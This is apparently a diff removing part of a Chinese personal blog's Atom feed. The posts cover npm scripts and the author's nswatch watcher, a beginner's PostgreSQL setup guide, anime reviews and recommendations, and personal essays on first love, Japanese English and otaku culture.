-<p>你并不需要在 npm scripts 里用一些很高深的命令行，很多 unix 命令是需要花很长时间学习的。像类似 rm -rf 之类的命令很容易掌握，而且也有相应的 npm 包 <a href="https://github.com/isaacs/rimraf" target="_blank" rel="external">rimraf</a> 让你使用，且跨平台支持。</p>
-<ol>
-<li>npm scripts 不够强大吗?</li>
-</ol>
-<pre><code class="JSON">{
-  &quot;scripts&quot;: {
-    &quot;clean&quot;: &quot;rimraf ./dist &amp;&amp; mkdir dist&quot;,
-    &quot;prebuild&quot;: &quot;npm run clean&quot;,
-    &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack&quot;
-  }
-}
-</code></pre>
-<p>npm scripts 甚至支持 <code>pre</code> <code>post</code> 这些 hook 让你在相应的一个 task 之前和之后调用。</p>
-<p>你可以直接执行一个文件来完成相应的构建工作，这让你几乎能做任何 gulp 能做的事:</p>
-<pre><code class="JSON">{
-  &quot;scripts&quot;: {
-    &quot;build&quot;: &quot;node build.js&quot;
-  }
-}
-</code></pre>
-<ol>
-<li>npm scripts 不是跨平台的</li>
-</ol>
-<p>因为你可能会在 npm scripts 里用一些 unix 命令，解决方案有很多，比如用 npm 包替代这些命令。</p>
-<ol>
-<li>可维护性</li>
-</ol>
-<p>gulp tasks 也多了以后会变得很难维护，npm scripts 也是。解决方案是推荐写精简的 script，比如一个 script 只干一件事。或者很长很复杂的话你就需要专门放到一个 JS 文件里然后再在 npm scripts 里调用了。</p>
-<h2 id="nswatch"><a href="#nswatch" class="headerlink" title="nswatch"></a><span>nswatch</span></h2><blockquote>
-<p><a href="https://github.com/egoist/nswatch" target="_blank" rel="external">https://github.com/egoist/nswatch</a></p>
-</blockquote>
-<p>在 npm scripts 里只执行一个构建任务你可能不需要类似 <code>gulp.watch</code> 这样的功能，因为大部分构建工具都自带了 watch 功能，比如 <code>webpack --watch</code> 和 <code>rollup --watch</code>，但是排除这种情况在构建多个任务的时候就不方便了。</p>
-<p>比如你要同时用一些 <code>.jade</code> <code>.css</code> <code>.js</code> 这些文件分别编译成 <code>.html</code> <code>.css</code> <code>.js</code> 文件，开发的时候怎么搞啊，怎么 watch 这些文件然后执行 rebuild 呢？好吧，你又想到了 <code>gulp</code> 😂</p>
-<p>不过现在有 <code>nswatch</code> 了，为了解决类似的需求我今早洗澡之后写的。和 <code>gulp.watch</code> 类似，监听一些文件，不过这里是执行相应的 npm script。</p>
-<p>你的 npm scripts:</p>
-<pre><code class="JSON">{
-  &quot;scripts&quot;: {
-    &quot;build:js&quot;: &quot;node scripts/build js&quot;,
-    &quot;build:html&quot;: &quot;node script/build html&quot;,
-    &quot;build:css&quot;: &quot;node scripts/build css&quot;
-  }
-}
-</code></pre>
-<p>然后你可以在 <code>scripts/build.js</code> 里用你喜欢的 npm 包，比如 rollup, jade, postcss，来编译相应文件。</p>
-<p>最后添加 <code>nswatch</code>:</p>
-<pre><code class="JSON">{
-  &quot;scripts&quot;: {
-    &quot;watch&quot;: &quot;nswatch src/*.js --script build:js &amp; nswatch src/*.css --script build:css  &amp; nswatch src/*.jade --script build:html &quot;
-  }
-}
-</code></pre>
-<p>由于有三个任务所以写得很长，你可以把它放进单独文件 <code>scripts/watch.js</code>:</p>
-<pre><code class="JavaScript">const watch = require(&#39;nswatch&#39;)
-
-watch(&#39;./src/*.js&#39;, [&#39;build:js&#39;])
-watch(&#39;./src/*.jade&#39;, [&#39;build:html&#39;])
-watch(&#39;./src/*.css&#39;, [&#39;build:css&#39;])
-</code></pre>
-<p>然后执行 <code>node scripts/watch</code> 一切都能运行了！</p>
-<p>最后你可能还是需要把 <code>node scripts/watch</code> 写进 <code>package.json</code>，以后都用 <code>npm run watch</code> 来执行:</p>
-<pre><code class="JSON">{
-  &quot;scripts&quot;: {
-    &quot;watch&quot;: &quot;node scripts/watch&quot;
-  }
-}
-</code></pre>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;为什么用-npm-scripts&quot;&gt;&lt;a href=&quot;#为什么用-npm-scripts&quot; class=&quot;headerlink&quot; title=&quot;为什么用 npm scripts ?&quot;&gt;&lt;/a&gt;&lt;span&gt;为什么用 npm scripts ?&lt;/span&gt;&lt;/h2&gt;
-    
-    </summary>
-    
-    
-      <category term="gulp" scheme="https://blog.whilte.cn/tags/gulp/"/>
-    
-      <category term="npm" scheme="https://blog.whilte.cn/tags/npm/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>菜月昴前传</title>
-    <link href="https://blog.whilte.cn/2016/08/03/subaru-be-loyal-or-jerk/"/>
-    <id>https://blog.whilte.cn/2016/08/03/subaru-be-loyal-or-jerk/</id>
-    <published>2016-08-03T14:46:52.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>从零开始的异世界生活</strong> 的最虐心阶段已经过去了？我小说只看到了这以后的一点剧情，所以并不能确定，不过很难想象之后还会有剧情能比 15/17/18 集更触动我。</p>
-<p>菜月昴说他会开始踏上成为蕾姆理想中的英雄之路，如果没有之前蕾姆的鼓励，那他说出这番话势必会再次被人口诛笔伐，史上最弱男主的确是事实。然而菜月昴的逆袭是剧情需要，Re:Zero 不可能一直这样 dark 下去，无限循环的死亡回归出现太多反而会引起不适。</p>
-<p>按照一般向展开，男主应该是和女主一起秒天秒地秒空气之后拯救众人，幸福美满地回家，这样才有值得后代谈论的事。而 Re:Zero 并不是这样，女主从某一集开始就隐形了，于是后面变成男主为了救一个长时间不上大屏幕露脸的女主死了很多次，然后就是爱着男主的某个女仆为了不让男主死而让自己死了很多次。</p>
-<p>简单替换一下，男主是菜月昴，女主是艾米莉亚，女仆是蕾姆。</p>
-<p>他们之间的关系可以概括为:</p>
-<blockquote>
-<p>艾米莉亚从小混混手里救了菜月昴，菜月昴认定这是自己命中注定的另一半，开始大男子主义地施加各种保护，不管她需不需要。虽然之后的确是男主救了艾米莉亚，不过这也全靠他来到异世界获得的能力「死亡回归」，照这样来说真正救艾米莉亚的是沙提拉?</p>
-<p>菜月昴从森林魔兽手里救了蕾姆，然后蕾姆认定菜月昴是自己的英雄。蕾姆可以理解，毕竟我们看到了关于蕾姆小时候的回忆。菜月昴的确让蕾姆停止的时间重新开始流动了。只是对于菜月昴，他对艾米莉亚的爱有点空穴来风似的。</p>
-</blockquote>
-<p>菜月昴的人物刻画很写实，这是这个异世界里唯一接近现实的东西了，去掉「异世界」这个设定简直可以直接给「欢迎来到 NHK」拍续集。</p>
-<p>Re:Zero 有一点很矛盾，就是「死亡回归」这个设定，这是菜月昴反复经受折磨的关键，也是菜月昴拯救艾米莉亚的关键，没有这个能力也许第一集就能完结了。所以菜月昴到底该痛恨这个诅咒还是接受并利用它，大概是主要剧情想要描述的东西之一。</p>
-<p>最后有一点有意思的猜测是，一般各种套路中，两个都是单方面爱着自己所爱的人最终走在了一起。</p>
-<p>不过不管后面如何发展，菜月昴到目前为止就像他自己说的那样差劲，而蕾姆只是不想看到曾经治愈了自己的人这样堕落下去。</p>
-<p>对的，你是否也已经发现了:</p>
-<p><img src="https://oidzj4vwh.qnssl.com/blog/57a1a6c6a86f0.jpg" alt="img"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;strong&gt;从零开始的异世界生活&lt;/strong&gt; 的最虐心阶段已经过去了？我小说只看到了这以后的一点剧情，所以并不能确定，不过很难想象之后还会有剧情能比 15/17/18 集更触动我。&lt;/p&gt;
-&lt;p&gt;菜月昴说他会开始踏上成为蕾姆理想中的英雄之路，如果没有之前蕾姆的鼓励
-    
-    </summary>
-    
-    
-      <category term="anime" scheme="https://blog.whilte.cn/tags/anime/"/>
-    
-      <category term="rezero" scheme="https://blog.whilte.cn/tags/rezero/"/>
-    
-      <category term="rem" scheme="https://blog.whilte.cn/tags/rem/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>日本人的英语差劲透了吗</title>
-    <link href="https://blog.whilte.cn/2016/07/04/japanese-suck-at-english/"/>
-    <id>https://blog.whilte.cn/2016/07/04/japanese-suck-at-english/</id>
-    <published>2016-07-04T06:28:49.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>这是个很片面的看法，不过的确有些日本人确实是这样。就像很多中国人连普通话都说不好。</p>
-<p>但是这种看法变成一种现象就很奇怪了，就像你说上海的女人都很强势一样。</p>
-<p>特别是有些人耳朵聋了，一听到从日本人嘴里冒出来的英文都打上「日式英语」的标签。</p>
-<p>其实即便有些日本人平时生活里说着日式英语，但是一到正式场合的时候都会尽量用标准的英语，比如你可能知道的仓木麻衣，她有首英文歌 <a href="http://music.163.com/#/m/song?id=589136" target="_blank" rel="external">Secret Of My Heart</a> 里的英语应该能算作很标准了吧，可她接受采访的时候基本上都是用罗马音来读英语，比如 friendly 读成 「furenteri」。你可以联想成中文里的音译词，比如「麦当劳」「沙发」，如果叫你在说中文的时候用标准的英语说这些词你是不是也会感到不快呢？试试吧:</p>
-<ul>
-<li>今天我去 IKEA 买了个 Sofa, 然后去 Mc Donald 吃了午餐。</li>
-<li>今天我去宜家买了个沙发，然后去麦当劳吃了午餐。</li>
-</ul>
-<p>很多时候人们在线用文字交流，所以相关单词写成英文原文也可以，但是看到的时候常常也会联想到这个词的中文音译。</p>
-<p>说实话，这些日式英语不过也就是日语里的音译词，没什么可笑的，因为你也天天在接触，只不过是用中文，只不过是用拼音而不是罗马音。拼音的发音相似度和英文不高，所以没有很多人纠结，而很多罗马音读起来至少有半个音节和英语一样，于是有人便成为了这方面的评论家了。同时因为大多数的中文音译词读起来都和原词差距比较大，自然就没有太多中国人在说英语的时候插着说这些音译词。</p>
-<p>不信的话试着对老外说「Thank you for today! 拜拜」。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这是个很片面的看法，不过的确有些日本人确实是这样。就像很多中国人连普通话都说不好。&lt;/p&gt;
-&lt;p&gt;但是这种看法变成一种现象就很奇怪了，就像你说上海的女人都很强势一样。&lt;/p&gt;
-&lt;p&gt;特别是有些人耳朵聋了，一听到从日本人嘴里冒出来的英文都打上「日式英语」的标签。&lt;/p&gt;
-&lt;p
-    
-    </summary>
-    
-    
-      <category term="japanese" scheme="https://blog.whilte.cn/tags/japanese/"/>
-    
-      <category term="prejudice" scheme="https://blog.whilte.cn/tags/prejudice/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>二〇一六年七月新番推荐</title>
-    <link href="https://blog.whilte.cn/2016/07/03/2016-7-anime-recommendations/"/>
-    <id>https://blog.whilte.cn/2016/07/03/2016-7-anime-recommendations/</id>
-    <published>2016-07-03T14:22:26.000Z</published>
-    <updated>2017-04-23T10:44:16.163Z</updated>
-    
-    <content type="html"><![CDATA[<p>本季我在追的新番大概有 12 部之多！是今年前两季（9、8部）所不能比的，不过之前的数据其实有些水分，有些番是我写了推荐之后才开始看的 XD 所以可能不止那个数字。</p>
-<h2 id="周一"><a href="#周一" class="headerlink" title="周一"></a><span>周一</span></h2><h3 id="弹丸论破3-未来篇"><a href="#弹丸论破3-未来篇" class="headerlink" title="弹丸论破3 未来篇"></a>弹丸论破3 未来篇</h3><p>完全是冲着弹丸论破第一季看的，据说新作是完全原创，总之还是怀着情怀先看一下，也许还不错呢。</p>
-<h3 id="orange橙色奇迹"><a href="#orange橙色奇迹" class="headerlink" title="orange橙色奇迹"></a>orange橙色奇迹</h3><p>写信给十年前的自己，为了不让过去的自己做出那些让自己后悔的事！感觉是文艺版命运石之门。</p>
-<h2 id="周二"><a href="#周二" class="headerlink" title="周二"></a><span>周二</span></h2><h3 id="灵能百分百"><a href="#灵能百分百" class="headerlink" title="灵能百分百"></a>灵能百分百</h3><p>ONE 老师另一作品，长得很像琦玉老师的双胞胎弟弟啊，动画肯定也很好看就是了。不多说了快上车吧！</p>
-<h3 id="魔装学园H×H"><a href="#魔装学园H×H" class="headerlink" title="魔装学园H×H"></a>魔装学园H×H</h3><p>有着和「恶魔高校DxD」同样结构的名字一眼就能看出其内涵所在了，车已经开了。</p>
-<h3 id="禁忌咒文"><a href="#禁忌咒文" class="headerlink" title="禁忌咒文"></a>禁忌咒文</h3><p>女主好像我的艾莲啊，而且打斗场面也很炫酷。</p>
-<h2 id="周三"><a href="#周三" class="headerlink" title="周三"></a><span>周三</span></h2><p>没有，陪女朋友吧。</p>
-<h2 id="周四"><a href="#周四" class="headerlink" title="周四"></a><span>周四</span></h2><p>没有，去揉女朋友的胸吧。</p>
-<h2 id="周五"><a href="#周五" class="headerlink" title="周五"></a><span>周五</span></h2><h3 id="弹丸论破3-绝望篇"><a href="#弹丸论破3-绝望篇" class="headerlink" title="弹丸论破3 绝望篇"></a>弹丸论破3 绝望篇</h3><p>同之前的理由。</p>
-<h3 id="半田君传说"><a href="#半田君传说" class="headerlink" title="半田君传说"></a>半田君传说</h3><p>看介绍像七月的坂本君，不过不是逼王，是衰王 XD</p>
-<h3 id="ReLIFE"><a href="#ReLIFE" class="headerlink" title="ReLIFE"></a>ReLIFE</h3><p>尼特族男主吃下 APTX4869 后身体回到 17 岁重新体验高中生活，合法地泡女高中生。</p>
-<h2 id="周六"><a href="#周六" class="headerlink" title="周六"></a><span>周六</span></h2><h3 id="91Days"><a href="#91Days" class="headerlink" title="91Days"></a>91Days</h3><p>这是个有关复仇的故事（阴暗。</p>
-<h3 id="食戟之灵-第二季"><a href="#食戟之灵-第二季" class="headerlink" title="食戟之灵 第二季"></a>食戟之灵 第二季</h3><p>药王还有人不知道吗，我喜欢爱丽斯。</p>
-<h3 id="时间旅行少女"><a href="#时间旅行少女" class="headerlink" title="时间旅行少女"></a>时间旅行少女</h3><p>我喜欢时间穿越类的，比如以前的「穿越时空的少女」。</p>
-<h2 id="周日"><a href="#周日" class="headerlink" title="周日"></a><span>周日</span></h2><h3 id="情热传说-the-X"><a href="#情热传说-the-X" class="headerlink" title="情热传说 the X"></a>情热传说 the X</h3><p>ufotable 出品，经费当然不要钱。</p>
-<h3 id="DAYS"><a href="#DAYS" class="headerlink" title="DAYS"></a>DAYS</h3><p>足球类的动画，看了一集我感觉足球配合相关的刻画还不错，相信会是个很燃的故事。</p>
-<h3 id="七大罪-第二季"><a href="#七大罪-第二季" class="headerlink" title="七大罪 第二季"></a>七大罪 第二季</h3><p>只有四集，伊丽莎白粉当成 OVA 看吧！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;本季我在追的新番大概有 12 部之多！是今年前两季（9、8部）所不能比的，不过之前的数据其实有些水分，有些番是我写了推荐之后才开始看的 XD 所以可能不止那个数字。&lt;/p&gt;
-&lt;h2 id=&quot;周一&quot;&gt;&lt;a href=&quot;#周一&quot; class=&quot;headerlink&quot; title
-    
-    </summary>
-    
-    
-      <category term="animes" scheme="https://blog.whilte.cn/tags/animes/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第一次恋爱</title>
-    <link href="https://blog.whilte.cn/2016/07/01/first-love/"/>
-    <id>https://blog.whilte.cn/2016/07/01/first-love/</id>
-    <published>2016-07-01T10:50:57.000Z</published>
-    <updated>2017-04-23T10:44:16.167Z</updated>
-    
-    <content type="html"><![CDATA[<p>又是一年七月一日，然而这对我并不是一个有什么意义的日子。</p>
-<p>最近我的运气算是差到了极点，未来在牙科七进七出都不是梦了。而每到这种万物于我皆衰败的时候，我总是会纯情地想起她，不同于以往的是，我似乎已经被某些事折腾得累了，也逐渐想明白了一些，我不再讨厌她之前的决定，现在看来一切都是在科学的发展着。</p>
-<p>其实高中的时候我便不相信恋爱，同学间的懵懂情愫对我来说可有可无。就像我高中暗恋的她，有男朋友的她很喜欢笑，和男生打成一片，和他也如胶似漆，而我只是默默远观，并且这一切一直都没有改变，我的不存在没有改变任何事，一切都在开心地运转。</p>
-<p>话说男生喜欢一个女生最明显的表现就是喜欢和她对着干，很对，我教科书式得对着干让她没有注意到丝毫我对她的感情。</p>
-<p>看起来多么悲情和可怜的家伙啊，你以为我是这样？别，我的形象其实可以更高大。</p>
-<p>在高三最后半年，突然冒出两个喜欢我的女生，我使劲想了想却记不起她们的名字，至于样貌嘛，我从一开始就不太清楚。</p>
-<p>我对她们感到很抱歉，那段时间我的孤独症正值发病期，伴随着即将毕业再也看不见“她”的心情我用这两个女生打发了一段无聊的时光，虽然仅限于网络。</p>
-<p>她们还有个身份就是我隔壁班的同学，至于我对她们说“不”后她们夸张的反应，我也表示很遗憾，一切都是我的错。</p>
-<p>我之前暗恋的她还有她们似乎占了很大篇幅，其实我真正想说的是我大学的“她”，对，一切都只是引子而已。</p>
-<p>要说长相没人会说她很好看，我也不会。可我就是喜欢。我很惭愧我不能夸我喜欢的人好看，不能露出惊为仙女的表情，我只是默默按耐住内心躁动的情绪，要说唯一能想到的形容词，那就是「百看不厌」。</p>
-<p>多么可笑的故事开局，所谓「百看不厌」是一种喜欢吗，我完全不知道。不过我很庆幸她有所回应，或者更客观地说是「没有拒绝」，就这样我学校生涯最开心的几个月开始了。第一次恋爱我很手足无措，面对她的时候显得很幼稚，虽然也许行为上并没有表现出来，因为我看着比较木讷，但内心其实是在拼命掩盖着。</p>
-<p>那是在一年暑期的前几个月，我常常在傍晚约她去操场散步，女生宿舍就在体育场旁边，因此每次我过去都可以看到她在等我。哦不，是我记错了，每次我去的时候她都还没有下楼。不过还好，每次看见她走出宿舍她都在笑，她笑的时候眼睛会显得更小，似乎面部所有部位都在抒发感情。而我和她在操场上最难忘的是两件事，一是她经常用我的手机玩游戏，而我就在旁边看她玩，因为这个我学会了植物大战僵尸；二是某次我和她坐在足球场的球门附近，突然一个不认识的人跑了过来问我要电话号码，事后我才意识到她是和附近的几个人玩真心话大冒险输了，该死。</p>
-<p>还有什么值得回忆的事吗，尽管只过了一两年有些事我也记不太清了，不过大部分都可以一句话带过——周末我有时会约她去图书馆看书，玩电脑，刚巧那个时候我们都看《吸血鬼日记》和《行尸走肉》，我就和她在图书馆一起看了一段，然而效果并不理想；她四级考试连挂两次之后我陪她去买习题；周末她会去附近的沃尔玛采购食物，所以有几次我因为这个找借口在周末留在学校，为了能陪她一起去；有次班上一起出去玩，刚巧我每个月有几天心情很不好，我就一个人躺在巴士的最后一排，她和其他人玩得很开心，由于我穿着短裤躺着，不方便揣钥匙，所以我让她帮我拿一下钥匙，计划通，这种感觉挺好……</p>
-<p>说了一堆可有可无的小事，只有最后一件是我差点忘了的。那是暑假之前我们最后一天在学校，我收拾好行李准备回家了，忘了什么原因，似乎是刚好顺路，在回家之前我可以陪她坐一段地铁。平淡无奇的事，不过能够看到她「在地铁上的样子」也算某种程度上的「第一次」。之后换乘的时候我们路线相反，因此分道扬镳了。再出了地铁口之后，天上下起了蒙蒙细雨，一个路人甲走了过来问能不能买我的伞，我却直接送给了她，怪我毫无预见性，不一会儿小于就变成了十分变态的大雨。回到家之后我告诉了她这件事，我能想象到屏幕那边她的笑脸。</p>
-<p>没想到暑假回来，她有了男朋友，是她青梅竹马的高中同学。我甚至忘了我是怎么知道这一事实的，她说她其实一直喜欢他，只是他有女朋友，她是在等。慢着，我是不是听错了，好吧没有。之后的事我就不想再描述了，不过这些「不可描述的事」中有一件是某次我在食堂中央区域吃饭，她牵着男朋友进了食堂，她很明显没注意到我，然后和男朋友走向了二楼。</p>
-<p>在那之后的一年里，我都想知道为什么，虽然原因也许根本不重要，我也只是想有个充分的让我放弃的理由。最开始我难以接受，她会这样对我上帝能想到吗，我让自己讨厌她以此来证实她的决定是对的，真可怜啊，从来没有被接受却要承受被拒绝的心情。如果从一开始她就不给我任何回应就好了，不努力考零分和没日没夜学习最后考了 59 分还是后者来的伤害更大。不过能怪她吗，毕竟是同班同学，直接拒绝了我恐怕也很尴尬。</p>
-<p>WTF? 似乎最开始我表白才是最大的错?这是我第一次想拥有哆啦A梦。</p>
-<hr>
-<p>有些人在描述自己「不可描述经历」的时候往往会写出流水账，因为那个时候他们势必会参杂着某些难以抑制的感情，很难像黄健翔那样酒后激情洋洋洒洒脱口而出「……伟大的意大利！伟大的意大利的左后卫！马尔蒂尼，今天生日快乐！意大利万岁！」。</p>
-<p>你之所以能看到这样一篇抑扬顿挫的抒情散文，完全是因为我已经拥有了二次元的爱，对那些狗屁的三次元恋爱毫无留恋。</p>
-<p><img src="https://o68eee1f9.qnssl.com/16-7-1/26410635.jpg" alt="fuck"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;又是一年七月一日，然而这对我并不是一个有什么意义的日子。&lt;/p&gt;
-&lt;p&gt;最近我的运气算是差到了极点，未来在牙科七进七出都不是梦了。而每到这种万物于我皆衰败的时候，我总是会纯情地想起她，不同于以往的是，我似乎已经被某些事折腾得累了，也逐渐想明白了一些，我不再讨厌她之前的决定，
-    
-    </summary>
-    
-      <category term="life" scheme="https://blog.whilte.cn/categories/life/"/>
-    
-    
-      <category term="love" scheme="https://blog.whilte.cn/tags/love/"/>
-    
-      <category term="shangjiamin" scheme="https://blog.whilte.cn/tags/shangjiamin/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>死宅什么的最好了</title>
-    <link href="https://blog.whilte.cn/2016/06/23/otaku-is-the-best/"/>
-    <id>https://blog.whilte.cn/2016/06/23/otaku-is-the-best/</id>
-    <published>2016-06-23T08:02:49.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>相比「死宅什么的最好了」这种论调，更常见的是「死宅什么的最恶心了」，真的是这样吗？那我们先来看看:</p>
-<p><img src="https://o68eee1f9.qnssl.com/16-6-23/23095294.jpg" alt="1"></p>
-<p>相信各位客官都看到了，这是何等变态的言论啊！</p>
-<p>幸好似乎出现了主持正义的民众:</p>
-<p><img src="https://o68eee1f9.qnssl.com/16-6-23/9021550.jpg" alt="2"></p>
-<p>什么？我搞错了，是的，这是何等的无耻啊，这个死宅居然说自己是我女朋友的老公！</p>
-<hr>
-<p>相信到这里各位拥有忍者动态视力的客官已经看清楚了，死宅什么的就是不分青红皂白自称是我女朋友的老公的那一类人，该杀！</p>
-<h2 id="剧情反转"><a href="#剧情反转" class="headerlink" title="剧情反转"></a><span>剧情反转</span></h2><p>我察觉到有些不对，表达对我女朋友的向往有什么不对吗，死宅的这种精神反而值得钦佩，明知道事实不会因为自己的意淫而得到任何改变。</p>
-<p>这种精神除了刚出生的婴儿和精神病院的智障以外，上帝只给了死宅。</p>
-<p>南无三，这是何等的珍贵啊！</p>
-<p><em>开什么玩笑啊喂！</em>&lt;(｀^´)&gt; </p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;相比「死宅什么的最好了」这种论调，更常见的是「死宅什么的最恶心了」，真的是这样吗？那我们先来看看:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://o68eee1f9.qnssl.com/16-6-23/23095294.jpg&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
-&lt;p&gt;相信各位
-    
-    </summary>
-    
-      <category term="anime" scheme="https://blog.whilte.cn/categories/anime/"/>
-    
-    
-      <category term="otaku" scheme="https://blog.whilte.cn/tags/otaku/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PostgreSQL 简明指南</title>
-    <link href="https://blog.whilte.cn/2016/04/25/postgresql-simple-guide/"/>
-    <id>https://blog.whilte.cn/2016/04/25/postgresql-simple-guide/</id>
-    <published>2016-04-25T09:06:05.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>边学边记录，有错请指出。（Keep Updating…）</p>
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a><span>基础</span></h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>postgresql-contrib</code> 不是必需的，它提供一些额外的功能。</p>
-<pre><code class="bash">$ sudo apt-get update
-$ sudo apt-get install postgresql postgresql-contrib
-</code></pre>
-<p>安装完成后，它会自动在你的系统上新建一个叫 <code>postgres</code> 的用户，之后你需要切换过去来使用 <code>PostgreSQL</code>:</p>
-<pre><code class="bash">$ sudo -i -u postgres
-</code></pre>
-<p>进入交互模式:</p>
-<pre><code class="bash">$ psql
-# 想退出则输入 `\q`
-</code></pre>
-<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>用默认账户登录到默认数据库:</p>
-<pre><code class="bash">$ sudo -u postgres psql template1
-</code></pre>
-<p>修改默认账户的密码:</p>
-<pre><code class="sql">$ postgres=# ALTER USER postgres with encrypted password &#39;xxxxxxx&#39;;
-</code></pre>
-<p>然后修改 <code>pg_hba.conf</code> 让其用 <code>md5</code> 方式加密:</p>
-<pre><code class="bash"># 9.1 是版本号
-$ sudo vim /etc/postgresql/9.1/main/pg_hba.conf
-</code></pre>
-<p>这样修改: local      all     postgres     <del>peer</del> md5</p>
-<p>重启数据库:</p>
-<pre><code class="bash">$ sudo /etc/init.d/postgresql restart
-</code></pre>
-<h3 id="新建用户和数据库"><a href="#新建用户和数据库" class="headerlink" title="新建用户和数据库"></a>新建用户和数据库</h3><p>在默认的 Linux 账户 <code>postgres</code> 下，你可以创建创建一个新的用户:</p>
-<pre><code class="sql">$ postgres=# CREATE USER egoist WITH PASSWORD &#39;your_password&#39;;
-</code></pre>
-<p>下一步是创建一个数据库，并让指定用户据有读写权限:</p>
-<pre><code class="sql">$ postgres=# CREATE DATABASE database_a;
-</code></pre>
-<p>之后给予数据库 <code>database_a</code> 的权限到用户 <code>egoist</code>:</p>
-<pre><code class="sql">$ postgres=# GRANT ALL PRIVILEGES ON DATABASE database_a to egoist;
-</code></pre>
-<h3 id="数据库相关查询"><a href="#数据库相关查询" class="headerlink" title="数据库相关查询"></a>数据库相关查询</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><pre><code class="bash"># 当前用户
-# \l 或者 \list
-$ user=# \list
-
-# 非 psql 交互模式下
-$ psql -U username -l
-</code></pre>
-<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a><span>推荐阅读</span></h2><ul>
-<li><a href="http://postgresguide.com" target="_blank" rel="external">PostgreSQL Guide</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;边学边记录，有错请指出。（Keep Updating…）&lt;/p&gt;
-&lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;&lt;span&gt;基础&lt;/span&gt;&lt;/h2&gt;&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装
-    
-    </summary>
-    
-    
-      <category term="postgresql" scheme="https://blog.whilte.cn/tags/postgresql/"/>
-    
-      <category term="database" scheme="https://blog.whilte.cn/tags/database/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>二〇一六年四月新番推荐</title>
-    <link href="https://blog.whilte.cn/2016/04/10/2016-4-anime-recommendations/"/>
-    <id>https://blog.whilte.cn/2016/04/10/2016-4-anime-recommendations/</id>
-    <published>2016-04-10T09:18:27.000Z</published>
-    <updated>2017-04-23T10:44:16.163Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="周一"><a href="#周一" class="headerlink" title="周一"></a><span>周一</span></h2><h3 id="Re：从零开始的异世界生活"><a href="#Re：从零开始的异世界生活" class="headerlink" title="Re：从零开始的异世界生活"></a>Re：从零开始的异世界生活</h3><p>这部番番如其名，讲的是「异世界」的奇遇。总之是一个「穿越类」的剧情，不知道受哪股力量操纵男主从现代穿越到了一个疑似中世纪的时代，而且似乎男主也被赋予了某种力量……</p>
-<h2 id="周二"><a href="#周二" class="headerlink" title="周二"></a><span>周二</span></h2><h3 id="百武装战记"><a href="#百武装战记" class="headerlink" title="百武装战记"></a>百武装战记</h3><p>这是个「奇幻类」的轻小说改编作品，人类依靠名为「百武装」的武器同外星人战斗，喜闻乐见的男主进学院壮大后宫的梗。</p>
-<h2 id="周三"><a href="#周三" class="headerlink" title="周三"></a><span>周三</span></h2><h3 id="双星之阴阳师"><a href="#双星之阴阳师" class="headerlink" title="双星之阴阳师"></a>双星之阴阳师</h3><p>画风略猎奇，剧情很中国。大概是曾经最强的「阴阳师」遭受到重大打击颓废之后被女主唤醒的故事，然后我猜应该就是各种和「污秽」进行的战斗了。</p>
-<h2 id="周四"><a href="#周四" class="headerlink" title="周四"></a><span>周四</span></h2><p>没有，好好学习。</p>
-<h2 id="周五"><a href="#周五" class="headerlink" title="周五"></a><span>周五</span></h2><h3 id="在下坂本，有何贵干？"><a href="#在下坂本，有何贵干？" class="headerlink" title="在下坂本，有何贵干？"></a>在下坂本，有何贵干？</h3><p>四月装逼最强番，看了「坂本」之后我脑补了他和「一拳超人」打一架是什么样，画面太美。总之，坂本是个干什么都完美，「疑似外星人」，在学校里被「不管男女、老少」的人爱慕着的存在。笑点十足。</p>
-<h3 id="线上游戏的老婆不可能是女生"><a href="#线上游戏的老婆不可能是女生" class="headerlink" title="线上游戏的老婆不可能是女生"></a>线上游戏的老婆不可能是女生</h3><p>只看过一点漫画和 TV 版第一集，大概会是「奇幻」+「校园」类型的番，发展成「后宫」也是有可能的，喜欢「刀剑神域」的同学可以看看。</p>
-<h3 id="甲铁城的卡巴内利"><a href="#甲铁城的卡巴内利" class="headerlink" title="甲铁城的卡巴内利"></a>甲铁城的卡巴内利</h3><p>四月经费燃烧大作。OP 由 EGOIST、ED 由 Aimer 演唱，音乐由泽野弘之监制。这注定了至少这部番的音乐部分会像「罪恶王冠」一样令人印象深刻，就第一集的表现来说也的确如此，甚至出现了疑似「上吊神曲」的 BGM!</p>
